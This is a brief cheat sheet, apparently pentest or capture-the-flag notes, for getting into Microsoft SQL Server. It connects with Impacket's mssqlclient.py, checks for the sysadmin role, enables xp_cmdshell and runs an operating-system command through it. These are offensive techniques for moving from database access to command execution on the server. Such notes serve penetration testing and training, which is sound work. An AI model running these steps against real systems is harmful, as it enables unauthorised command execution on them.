# SQL
## Connect to SQL Server using Impacket
  mssqlclient.py [username]/sql_svc@[IP] -windows-auth
## Check privs
  SELECT IS_SRVROLEMEMBER ('sysadmin')
## Enable xp_cmdshell
  EXEC sp_configure 'Show Advanced Options', 1;

  reconfigure;

  sp_configure;

  EXEC sp_configure 'xp_cmdshell', 1

  reconfigure;

  xp_cmdshell "whoami"


